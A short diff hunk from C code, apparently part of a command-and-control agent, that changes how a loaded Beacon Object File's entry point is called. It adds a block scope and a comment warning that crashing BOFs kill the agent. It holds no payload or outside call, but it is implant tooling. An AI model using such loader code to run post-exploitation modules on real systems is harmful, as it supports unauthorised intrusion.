@@ -458,10 +458,14 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
         }
         if (!entryPoint) goto cleanup;
 
-        /* Call entry: void go(char *args, int alen) */
-        typedef void (*bof_entry_t)(char*, int);
-        bof_entry_t entry = (bof_entry_t)entryPoint;
-        entry((char*)args, (int)args_len);
+        /* Call entry: void go(char *args, int alen)
+         * Note: MinGW lacks __try/__except; a crashing BOF will terminate the agent.
+         * Use only trusted, tested BOFs. */
+        {
+            typedef void (*bof_entry_t)(char*, int);
+            bof_entry_t entry = (bof_entry_t)entryPoint;
+            entry((char*)args, (int)args_len);
+        }
     }
 
     /* Copy output */
